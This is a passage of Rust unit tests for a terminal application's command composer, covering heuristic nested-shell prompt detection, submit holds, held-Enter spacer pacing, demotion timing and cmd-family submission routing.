        // the prompt end.
        assert_eq!(
            cover_line_for(&st, &b, true, t1),
            Some(b.cursor_line()),
            "heuristic cell feeds the armed cover"
        );
        // ANY output byte after the mint tears the latch down…
        b.advance_live(b"x");
        assert!(!st.heur_live(&b), "output burst disarms instantly");
        assert_eq!(cover_line_for(&st, &b, true, t1), None, "cover drops with it");
        // …and the now-dirty row (`root@box:/# x`) must NOT re-arm even
        // after a full quiet window: the classifier IS the clean check.
        let t2 = t1 + HEUR_QUIET + Duration::from_millis(200);
        st.tick(&b, &recs, true, true, t2);
        assert!(!st.heur_live(&b), "dirty prompt never arms");
        // A fresh CLEAN prompt row re-mints after quiet.
        b.advance_live(b"\r\nroot@box:/# ");
        let t3 = t2 + HEUR_QUIET + Duration::from_millis(500);
        st.tick(&b, &recs, true, true, t3);
        assert!(st.heur_live(&b), "fresh clean prompt re-mints");
        // A tokened marker edge (the returning pre) ends the EPISODE, not
        // just the latch — integration owns the prompt again.
        st.on_stream_events(2, 1, t3);
        assert!(!st.heur_live(&b));
        assert!(!st.heur_episode, "marker edge closes the episode");
        assert!(st.at_prompt_latched(), "the real latch takes over");

        // Scope pin (the false-positive killer): the SAME grid state under
        // an ordinary busy command must never run the detector — `cargo
        // build` stalling ≥300ms with a `#`-tailed row is not our episode.
        let (b2, mut st2, _, t0b) = heur_episode_setup();
        let busy = vec![BlockRec {
            epoch: 1,
            n: 0,
            cmd: "cargo build".into(),
            cwd: None,
            exit: None,
            started_ms: 0,
            ended_ms: None,
            start_off: 0,
            end_off: None,
            truncated: false,
        }];
        let t1b = t0b + HEUR_QUIET + Duration::from_millis(100);
        st2.tick(&b2, &busy, true, true, t1b);
        assert!(
            !st2.heur_live(&b2),
            "detection is scoped to classified nested-shell episodes"
        );
        assert_eq!(st2.mode, ComposerMode::Raw(RawReason::Busy));
    }

    /// D2 submissions ride the Cmd-family synthetic-block ledger: dispatch
    /// in a heuristic episode sets `pending_submit_cmd` (zero PTY bytes from
    /// the GUI), pins the SubmitHold at the heuristic cell, and opens a
    /// HEURISTIC post-submit window; multi-line drafts are refused back to
    /// the visible draft; spacers stay honest bare-`\r` Input with no record
    /// and no hold.
    #[test]
    fn heur_submit_routes_ledger() {
        let (b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose);
        let cover = cover_line_for(&st, &b, true, t1);
        assert!(cover.is_some());
        let heur_col = b.cursor_col();

        // Multi-line: refused back to the draft — nothing fires uninspected.
        let (bytes, spacer) = st.dispatch_submission(&b, cover, None, "a\nb", t1);
        assert!(bytes.is_empty() && !spacer);
        assert_eq!(st.draft, "a\nb", "multi-line restored to the visible draft");
        assert!(st.take_submit_cmd().is_none());
        assert!(st.post_submit.is_none(), "no window for a refused dispatch");
        st.draft.clear();

        // Single line: the ledger lane.
        let (bytes, spacer) = st.dispatch_submission(&b, cover, Some("/"), "whoami", t1);
        assert!(bytes.is_empty(), "GUI ships zero PTY bytes — the daemon writes");
        assert!(!spacer);
        assert_eq!(st.take_submit_cmd().as_deref(), Some("whoami"));
        let h = st.submit_hold.as_ref().expect("hold pinned");
        assert_eq!(h.line, cover.unwrap(), "hold pinned at the heuristic row");
        assert_eq!(h.col, heur_col, "hold column = the latched cursor cell");
        let w = st.post_submit.expect("window open");
        assert!(w.heur, "the window resolves heuristically");
        assert_eq!(st.mode, ComposerMode::Compose, "submit never yields raw");

        // Spacer: plain `\r` Input — no record, no hold (no pre geometry
        // exists to heal the row it leaves behind; raw is honest).
        st.submit_hold = None;
        let (bytes, spacer) = st.dispatch_submission(&b, cover, None, "", t1);
        assert_eq!(bytes, b"\r");
        assert!(spacer);
        assert!(st.take_submit_cmd().is_none(), "a blank line is not a command");
        assert!(st.submit_hold.is_none());
    }

    /// D2 post-submit window: resolves on the FRESH heuristic latch (draft
    /// kept, Compose held); the integrated 300ms threshold must NOT fire
    /// mid-episode; with no fresh latch by HEUR_FLUSH the window closes but
    /// the editor STAYS and nothing flushes (REWRITTEN DELIBERATELY: this
    /// leg used to pin the HEUR_FLUSH raw flush + Raw(Busy) yield — the
    /// permanent-editor fix removes that yield on the heuristic lane too).
    #[test]
    fn heur_post_submit_resolution() {
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        let cover = cover_line_for(&st, &b, true, t1);
        let _ = st.dispatch_submission(&b, cover, None, "whoami", t1);
        assert!(st.post_submit.is_some());
        // Echo + output land (no prompt yet): the latch tears down.
        b.advance_live(b"whoami\r\nroot\r\n");
        assert!(!st.heur_live(&b));
        // Type-ahead into the next command buffers in the editor.
        st.draft = "id".into();
        // 350ms after dispatch — past the INTEGRATED threshold: the
        // heuristic window must hold (300ms would always lose to the
        // echo+output+quiet cycle a fresh latch needs).
        st.tick(&b, &recs, true, true, t1 + Duration::from_millis(350));
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.post_submit.is_some(), "heuristic window outlives 300ms");
        assert_eq!(st.draft, "id");
        // The fresh nested prompt paints; quiet elapses; the fresh latch
        // resolves the window — draft kept, Compose held, no bytes fired.
        b.advance_live(b"root@box:/# ");
        let t2 = t1 + Duration::from_millis(800);
        st.tick(&b, &recs, true, true, t2);
        assert!(st.heur_live(&b));
        assert!(st.post_submit.is_none(), "fresh latch closes the window");
        assert_eq!(st.mode, ComposerMode::Compose);
        assert_eq!(st.draft, "id", "draft survives the resolution");
        assert!(st.take_pending_clear().is_none(), "nothing flushed");

        // Threshold branch: no fresh latch by HEUR_FLUSH ⇒ the window
        // closes, Compose HOLDS, nothing flushes — the inner long-running
        // command keeps the editor and its visible draft (permanent editor).
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        let cover = cover_line_for(&st, &b, true, t1);
        let _ = st.dispatch_submission(&b, cover, None, "sleep 100", t1);
        b.advance_live(b"sleep 100\r\n"); // echo, then silence — no prompt
        st.draft = "id2".into();
        let late = t1 + HEUR_FLUSH + Duration::from_millis(10);
        st.tick(&b, &recs, true, true, late);
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "the heuristic threshold no longer yields the editor"
        );
        assert!(st.post_submit.is_none(), "window closed at HEUR_FLUSH");
        assert!(
            st.take_pending_clear().is_none(),
            "buffered typing never flushes raw"
        );
        assert_eq!(st.draft, "id2", "typing stays visible in the draft");
    }

    /// D2 hand-back (extends `nested_shell_reattach`): a heuristic-armed
    /// Compose survives the `exit` transition WITHOUT a mode flap — the
    /// returning tokened pre clears the heuristic state, the real latch +
    /// 133;B recapture take over the same event, and the gate stays AutoArm
    /// continuity through the still-open rec (F7).
    #[test]
    fn heur_handback() {
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose);
        st.has_focus = true;
        // `exit`: echo/output, then the login shell's tokened pre + prompt
        // + 133;B — the bug D re-attach shape.
        b.advance_live(b"exit\r\n");
        let mut frame = hook_bytes("pre", r#"{"e":0,"n":3,"d":"C:"}"#);
        frame.extend_from_slice(b"PS C:\\> ");
        frame.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&frame);
        let t2 = t1 + Duration::from_millis(50);
        pump_counters(&mut st, &b, t2);
        assert!(!st.heur_episode, "the pre edge closes the episode");
        assert!(!st.heur_live(&b));
        assert!(st.at_prompt_latched(), "the real latch takes over");
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "no mode flap through the hand-back"
        );
        // Gate continuity: the rec may still read open (Blocks round-trip
        // in flight) — F7 keeps the composer armed; the recaptured 133;B
        // certifies the cursor again.
        assert!(b.cursor_at_prompt_end());
        st.tick(&b, &recs, true, true, t2 + Duration::from_millis(16));
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    /// D2 end-to-end through the REAL `show()` path (headless egui, real
    /// RawInput events — the Bug C test pattern): at a heuristically armed
    /// composer, typed keys land in the DRAFT with zero PTY bytes, and
    /// Enter dispatches through the SubmitCommand ledger outbox — the exact
    /// production route central.rs drains into `send_cmd_submission`.
    #[test]
    fn show_heur_types_and_submits() {
        let (b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose);

        let ctx = egui::Context::default();
        let strip = Rect::from_min_max(Pos2::new(0.0, 564.0), Pos2::new(800.0, 600.0));
        let grid = Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 564.0));
        let frame = |st: &mut ComposerState, events: Vec<egui::Event>| {
            let raw = egui::RawInput {
                screen_rect: Some(Rect::from_min_max(
                    Pos2::ZERO,
                    Pos2::new(800.0, 600.0),
                )),
                events,
                ..Default::default()
            };
            let mut out = None;
            let _ = ctx.run_ui(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    out = Some(show(
                        ui,
                        strip,
                        grid,
                        Uuid::nil(),
                        st,
                        &b,
                        &recs,
                        1,
                        true,
                        false, // collapsed (C2): strip visible in this headless rig
                        false,
                        FontId::monospace(13.0),
                        None,
                        None,
                    ));
                });
            });
            let o = out.unwrap();
            st.has_focus = o.has_focus; // the app's per-frame sync
            o
        };
        // Frame 1: the armed editor takes egui focus.
        let o = frame(&mut st, vec![]);
        assert!(o.has_focus, "armed editor must hold focus");
        // Frame 2: typing lands in the draft — ZERO bytes reach the PTY.
        let o = frame(&mut st, vec![egui::Event::Text("whoami".into())]);
        assert!(o.write.is_empty(), "keystrokes never go raw while armed");
        assert_eq!(st.draft, "whoami");
        // Frame 3: Enter submits through the ledger lane.
        let o = frame(
            &mut st,
            vec![egui::Event::Key {
                key: Key::Enter,
                physical_key: None,
                pressed: true,
                repeat: false,
                modifiers: Modifiers::NONE,
            }],
        );
        assert!(
            o.write.is_empty(),
            "heuristic submissions ship zero GUI bytes — the daemon writes"
        );
        assert_eq!(st.take_submit_cmd().as_deref(), Some("whoami"));
        assert!(st.draft.is_empty());
        assert!(st.buffering(), "post-submit typeahead window opened");
    }

    /// D2 honest-degradation pin: no ^C is EVER fired at a heuristically
    /// detected prompt. A yielded episode (Esc) re-arms through ❯ Compose
    /// silently — activate() must neither chord nor reclaim (there is no
    /// 133;B capture to certify against); and the used episode never
    /// auto-re-arms to fight the user for focus.
    #[test]
    fn heur_activate_never_chords() {
        let (b, mut st, recs, t0) = heur_episode_setup();
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose);
        // The user yields to the grid: episode consumed, latch kept.
        st.blur_to_grid();
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        assert!(st.episode_used);
        st.tick(&b, &recs, true, true, t1 + Duration::from_millis(16));
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::UserRaw),
            "a used episode must not auto-re-arm (D7)"
        );
        // ManualOnly ❯ Compose click: arms silently.
        assert!(!b.cursor_at_prompt_end(), "no 133;B certainty exists here");
        let bytes = st.activate(&b);
        assert!(bytes.is_empty(), "never a chord at an uncertain prompt");
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.draft.is_empty(), "nothing reclaimed");
    }

    /// v0.1.1 (the wrong-capture `^C`-spam loop breaker): the activation
    /// clear chord ships at most ONCE per prompt epoch, and a column-0
    /// capture (only the prompt itself can start there) neither reclaims
    /// nor chords.
    #[test]
    fn activate_chord_once_per_prompt_epoch() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"junk"); // typed junk: cursor off the prompt end
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState::default();
        let chord = st.activate(&b);
        assert!(!chord.is_empty(), "first activation ships the clear chord");
        assert_eq!(st.draft, "junk", "reclaimable text pulled into the draft");
        // Same prompt epoch: no second chord, no duplicate reclaim.
        st.mode = ComposerMode::Raw(RawReason::UserRaw);
        assert!(
            st.activate(&b).is_empty(),
            "one clear attempt per prompt epoch"
        );
        assert_eq!(st.draft, "junk", "no duplicate reclaim");
        // A fresh pre (new prompt epoch) re-allows exactly one chord.
        b.advance_live(&hook_bytes("pre", r#"{"e":130,"n":2,"d":"C:"}"#));
        b.advance_live(b"PS C:\\> \x1b]133;B\x07");
        b.advance_live(b"junk2");
        st.mode = ComposerMode::Raw(RawReason::UserRaw);
        assert!(
            !st.activate(&b).is_empty(),
            "a fresh prompt epoch re-arms the chord"
        );
    }

    /// v0.1.1: a col-0 prompt-end capture is the ConPTY reorder shape — the
    /// "typed text" a reclaim would read IS the prompt string. Activation
    /// must arm silently: no chord, no reclaim.
    #[test]
    fn activate_never_chords_a_col0_capture() {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        b.enable_block_scan();
        // 133;B beats the prompt text into the stream (the race).
        b.advance_live(b"\x1b]133;B\x07");
        b.advance_live(b"[zany@MSI zany]$ ");
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState::default();
        assert!(
            st.activate(&b).is_empty(),
            "no chord may ship for a col-0 capture"
        );
        assert_eq!(
            st.draft, "",
            "the prompt string must never be reclaimed as typed input"
        );
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    /// Restored-render fix: an ACTIVE Compose whose cover certainty breaks
    /// (here: stray grid bytes move the cursor off the captured prompt end
    /// — the field shape was a resize repaint moving the real prompt off
    /// the cold-attach seed) must DEMOTE to Raw after the DEMOTE window
    /// instead of sitting forever as an armed hint lane under a raw prompt
    /// row with its own visible cursor. Draft survives; a transient blip
    /// inside the window never demotes; the clock never leaks across
    /// episodes.
    #[test]
    fn compose_demotes_after_sustained_certainty_loss() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);
        st.draft = "keep me".into();

        // Certainty breaks: bytes render into the grid without any hook —
        // the cursor leaves the captured prompt end and never comes back.
        b.advance_live(b"stray");
        assert!(!b.cursor_at_prompt_end());

        // Inside the window: still Compose (transients must not flap).
        let wake = st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose, "no instant demotion");
        assert!(
            wake.is_some_and(|w| w <= now + DEMOTE),
            "a pending demotion must schedule its own wakeup (idle terminals repaint rarely)"
        );
        st.tick(&b, &recs, true, true, now + DEMOTE - Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Compose);

        // Past the window: demoted, draft intact, episode NOT consumed (a
        // genuine fresh latch may auto-re-arm).
        st.tick(&b, &recs, true, true, now + DEMOTE);
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::NoPrompt),
            "sustained certainty loss steps Compose down to Raw"
        );
        assert_eq!(st.draft, "keep me", "demotion never destroys the draft");
        assert!(!st.episode_used);
    }

    #[test]
    fn compose_survives_certainty_blip_that_heals() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);

        // Blip: cursor drifts (conhost repaint mid-flight)…
        b.advance_live(b"x");
        st.tick(&b, &recs, true, true, now + Duration::from_millis(100));
        assert_eq!(st.mode, ComposerMode::Compose);

        // …and heals: a fresh prompt frame re-captures prompt_end exactly
        // where the cursor now sits (the live 133;B path).
        let mut frame = hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#);
        frame.extend_from_slice(b"\r\nPS C:\\> ");
        frame.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&frame);
        pump_counters(&mut st, &b, now + Duration::from_millis(200));
        assert!(b.cursor_at_prompt_end());

        // Well past DEMOTE from the original blip: still Compose (the clock
        // reset when health returned).
        st.tick(&b, &recs, true, true, now + DEMOTE + Duration::from_millis(200));
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "a healed blip must never demote later"
        );
    }

    /// Held-Enter stress (scope #3, user: "holding enter breaks the entire
    /// lining … puts me in powershell"): ~150 empty-Enter repeats must (a)
    /// never leave Compose (the lane and the arm survive), (b) coalesce to
    /// a CAPPED queue drained at the shell's prompt-render pace, one bare
    /// `\r` per completed round-trip, (c) leave a clean armed state after
    /// release, and (d) abandon the queue if the shell stops re-prompting.
    #[test]
    fn held_enter_paces_spacers_and_never_leaves_compose() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);

        // 5 seconds of ~30Hz key-repeat, delivered a few per frame.
        let mut dispatched = 0u32;
        let mut t = now;
        for burst in 0..50 {
            for _ in 0..3 {
                st.push_spacer();
            }
            assert!(
                st.pending.len() <= SPACER_QUEUE_CAP,
                "consecutive spacers must coalesce at the cap"
            );
            t += Duration::from_millis(33);
            st.tick(&b, &recs, true, true, t); // resolves a completed window
            if let Some((bytes, spacer)) = st.pump_pending(&b, None, None, t) {
                assert_eq!(bytes, b"\r");
                assert!(spacer);
                dispatched += 1;
                // The shell answers: echo scrolls, fresh prompt renders and
                // re-latches (pre + prompt text + 133;B) — the real pace.
                let json = format!(r#"{{"e":0,"n":{},"d":"C:"}}"#, burst + 10);
                let mut frame = hook_bytes("pre", &json);
                frame.extend_from_slice(b"\r\nPS C:\\> ");
                frame.extend_from_slice(b"\x1b]133;B\x07");
                b.advance_live(&frame);
                pump_counters(&mut st, &b, t);
            }
            st.tick(&b, &recs, true, true, t);
            assert_eq!(
                st.mode,
                ComposerMode::Compose,
                "held Enter must NEVER drop the composer to raw (burst {burst})"
            );
        }
        assert!(
            dispatched >= 10,
            "paced dispatch must make progress at prompt-render pace (got {dispatched})"
        );
        // Release: the residual queue drains and the state stays armed.
        for _ in 0..10 {
            t += Duration::from_millis(50);
            st.tick(&b, &recs, true, true, t);
            if st.pump_pending(&b, None, None, t).is_some() {
                let mut frame = hook_bytes("pre", r#"{"e":0,"n":99,"d":"C:"}"#);
                frame.extend_from_slice(b"\r\nPS C:\\> ");
                frame.extend_from_slice(b"\x1b]133;B\x07");
                b.advance_live(&frame);
                pump_counters(&mut st, &b, t);
            }
            st.tick(&b, &recs, true, true, t);
        }
        assert!(st.pending.is_empty(), "queue fully drained after release");
        assert_eq!(st.mode, ComposerMode::Compose, "armed lane survives the hold");
        assert!(b.cursor_at_prompt_end(), "clean prompt state after release");
    }

    #[test]
    fn spacer_queue_abandons_when_shell_stops_prompting() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        for _ in 0..3 {
            st.push_spacer();
        }
        assert!(
            st.pump_pending(&b, None, None, now).is_some(),
            "first \\r goes immediately"
        );
        // No pre ever comes back (hung shell): within the window nothing
        // more is sent; past it the queue is dropped, never blind-fired.
        assert!(st.pump_pending(&b, None, None, now + Duration::from_millis(100)).is_none());
        let late = now + POST_SUBMIT_FLUSH + Duration::from_millis(50);
        st.tick(&b, &recs, true, true, late);
        assert!(st.pending.is_empty(), "abandoned queue");
        assert!(st.take_pending_clear().is_none(), "spacers are never blind-fired");
        assert_eq!(st.mode, ComposerMode::Compose, "abandon is not a yield");
        assert!(
            st.pump_pending(&b, None, None, late + Duration::from_millis(50)).is_none(),
            "nothing left to send"
        );
    }

    #[test]
    fn demote_clock_never_leaks_across_episodes() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        b.advance_live(b"stray");
        st.tick(&b, &recs, true, true, now); // clock starts
        st.tick(&b, &recs, true, true, now + DEMOTE); // demoted
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::NoPrompt));

        // Fresh episode: new prompt, new arm — an immediately-unhealthy
        // frame must start a NEW clock, not inherit the old timestamp.
        let mut frame = hook_bytes("pre", r#"{"e":0,"n":3,"d":"C:"}"#);
        frame.extend_from_slice(b"\r\nPS C:\\> ");
        frame.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&frame);
        let t1 = now + DEMOTE + Duration::from_millis(100);
        pump_counters(&mut st, &b, t1);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose, "fresh latch re-arms");
        b.advance_live(b"y");
        st.tick(&b, &recs, true, true, t1 + Duration::from_millis(10));
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "a stale clock from the previous episode must not instant-demote"
        );
    }

    /// Latch the composer's counters from the backend's live feed state.
    fn pump_counters(st: &mut ComposerState, b: &TermBackend, now: Instant) {
        let f = b.block_feed.as_ref().unwrap();
        st.on_stream_events(f.pre_seen, f.exec_seen, now);
    }

    /// THE submit-flicker regression (user-reported twice): ConPTY delivers
    /// the exec OSC ahead of the asynchronously-rendered echo text, so the
    /// hook counter advancing must NOT release the hold while the covered
    /// row is still the bare prompt — and a partially rendered echo (less
    /// text than submitted) must keep holding too. Only the full echo in the
    /// row's cells releases.
    #[test]
    fn hold_survives_exec_hook_before_echo() {
        let mut b = backend_at_clean_prompt(); // "PS C:\> " row 0, prompt_end (0, 8)
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "echo hi".into();
        let (bytes, _) = st.submit(&b, cover_line_for(&st, &b, true, now), Some("C:\\"));
        assert_eq!(bytes, b"echo hi\r");
        assert_eq!(st.hold_line(&b, now), Some(0), "hold pinned to the prompt row");

        // exec hook scanned FIRST (ConPTY reorder); echo not yet rendered.
        b.advance_live(&hook_bytes("exec", r#"{"c":"echo hi"}"#));
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, false, now);
        assert_eq!(
            st.hold_line(&b, now),
            Some(0),
            "exec hook alone must NOT release: the row under the cover is still bare"
        );

        // Partial echo: the row shows LESS text than submitted — keep holding.
        b.advance_live(b"ec");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), Some(0), "partial echo must keep the hold");

        // Full echo in the row's cells ⇒ release, pixel-continuous swap.
        b.advance_live(b"ho hi");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "echo landing releases the hold");
    }

    /// SubmitHold backstops: cursor leaving the pinned row and grid scroll
    /// both prove the echo has been parsed (text renders in stream order
    /// before the accept-newline); the 250ms cap covers everything else;
    /// a coverless submit never creates a hold.
    #[test]
    fn submit_hold_backstops() {
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();

        // Cursor left the row ⇒ release even without a cell match.
        let mut b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "cls".into();
        let _ = st.submit(&b, Some(0), None);
        assert_eq!(st.hold_line(&b, now), Some(0));
        b.advance_live(b"\r\n");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "cursor below the row releases");

        // Grid scroll (prompt on the bottom row) ⇒ release: the pinned line
        // is stale and the echo preceded the scrolling newline.
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 4,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.advance(b"a\r\nb\r\nc\r\nPS> "); // cursor on row 3 (bottom)
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "quux".into();
        let _ = st.submit(&b, Some(3), None);
        assert_eq!(st.hold_line(&b, now), Some(3));
        b.advance(b"\r\nout"); // bottom-row newline: rows scroll into history
        assert!(b.history_size() > 0, "test must actually scroll");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "grid scroll releases");

        // Safety cap: nothing observable ever arrives.
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "slow".into();
        let _ = st.submit(&b, Some(0), None);
        assert_eq!(st.hold_line(&b, now), Some(0));
        // h.since is stamped inside submit(), after `now` — probe from a
        // fresh Instant so the cap has provably elapsed.
        let later = Instant::now() + SUBMIT_HOLD_MAX + Duration::from_millis(1);
        assert_eq!(st.hold_line(&b, later), None, "hold expires at the cap");

        // no cover ⇒ no hold (fallback lane submit doesn't flicker).
        let bb = TermBackend::new(GridSize::default());
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "x".into();
        let _ = st.submit(&bb, None, None);
        assert_eq!(st.hold_line(&bb, now), None);
    }

    /// P6b §5.2: Cmd-family submissions route through the SubmitCommand
    /// ledger — dispatch produces ZERO PTY bytes, parks the command on the
    /// once-draining outbox, and keeps every hold/window mechanic (the shell
    /// echo lands in the grid the same way, so the cover bridge is family-
    /// agnostic). The blind-queue pump inherits the routing (shared core).
    #[test]
    fn cmd_submission_routes_to_ledger() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "dir".into();
        let (bytes, spacer) = st.submit(&b, Some(0), Some("C:\\"));
        assert!(bytes.is_empty(), "cmd submission must carry no PTY bytes");
        assert!(!spacer);
        assert_eq!(st.take_submit_cmd().as_deref(), Some("dir"));
        assert!(st.take_submit_cmd().is_none(), "the outbox drains once");
        assert!(st.buffering(), "the typeahead window opens exactly like pwsh");
        assert_eq!(st.hold_line(&b, now), Some(0), "SubmitHold pins the cover");
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    /// P6b §6: the spacer gesture stays an honest bare `\r` Input (a blank
    /// line is not a command — no ledger record), and a multi-line dispatch
    /// (pasted `\n`, a multi-line history Run) REFUSES — restored to the
    /// visible draft, nothing fires uninspected, nothing is lost.
    #[test]
    fn cmd_spacer_and_multiline_rules() {
        let b = backend_at_clean_prompt();
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        pump_counters(&mut st, &b, Instant::now());
        st.mode = ComposerMode::Compose;
        let (bytes, spacer) = st.submit(&b, Some(0), None);
        assert_eq!(bytes, b"\r", "spacer = bare Enter, never a record");
        assert!(spacer);
        assert!(st.take_submit_cmd().is_none());
        st.post_submit = None;
        st.draft = "cd \\\ndir".into();
        let (bytes, spacer) = st.submit(&b, Some(0), None);
        assert!(bytes.is_empty() && !spacer);
        assert!(st.take_submit_cmd().is_none());
        assert_eq!(
            st.draft, "cd \\\ndir",
            "the refused multi-line submission returns to the draft"
        );
        assert!(
            st.post_submit.is_none(),
            "a refused dispatch must not open a submit window"
        );
    }

    /// P6b D15: activate() over a dirty prompt clears the line with ESC on
    /// cmd (in-place clear, no ^C splatter, no re-prompt needed) — win32
    /// KEY_EVENT pair under mode 9001, bare 0x1b otherwise; other families
    /// keep the Ctrl+C CancelLine.
    #[test]
    fn cmd_line_clear_chord_is_escape() {
        use egui::{Key, Modifiers};
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"di"); // typed junk: cursor off the prompt end
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        assert_eq!(st.activate(&b), vec![0x1b], "VT mode: bare ESC");
        b.win32_input = true;
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        assert_eq!(
            st.activate(&b),
            crate::win32_input::encode_key(Key::Escape, Modifiers::NONE).unwrap()
        );
        let mut st = ComposerState::default();
        assert_eq!(
            st.activate(&b),
            crate::win32_input::encode_key(Key::C, Modifiers::CTRL).unwrap(),
            "non-cmd families keep Ctrl+C"
        );
    }

    /// P6b: the observed-raw Enter detector behind the write:false capture —
    /// literal `\r` in both modes (VT Enter, pasted newlines under 9001) and
    /// the win32 VK_RETURN key-DOWN record; key-up alone and other keys
    /// never trigger.
    #[test]
    fn enter_detector_both_modes() {
        use egui::{Key, Modifiers};
        assert!(bytes_contain_enter(b"dir\r", false));
        assert!(!bytes_contain_enter(b"dir", false));
        assert!(bytes_contain_enter(b"abc\rdef", true), "pasted \\r counts under 9001");
        let enc = crate::win32_input::encode_key(Key::Enter, Modifiers::NONE).unwrap();
        assert!(bytes_contain_enter(&enc, true));
        // A key-UP-only record (Kd=0) is not a press.
        assert!(!bytes_contain_enter(b"\x1b[13;28;13;0;0;1_", true));
        let esc = crate::win32_input::encode_key(Key::Escape, Modifiers::NONE).unwrap();
        assert!(!bytes_contain_enter(&esc, true));
        // Truncated/garbage records never panic or false-positive.
        assert!(!bytes_contain_enter(b"\x1b[13;28", true));
        assert!(!bytes_contain_enter(b"\x1b[x;y;z;w_", true));
    }

    /// Regression for the cover paint gate: a live SubmitHold must keep the
    /// cover independent of the armed chain (comp_active false — e.g. an
    /// Esc-yield mid-hold). Gating the cover on the armed chain alone would
    /// pass the hold's state-machine tests yet drop the cover the instant
    /// Enter is pressed — flicker with green tests.
    #[test]
    fn cover_gate_includes_submit_hold() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
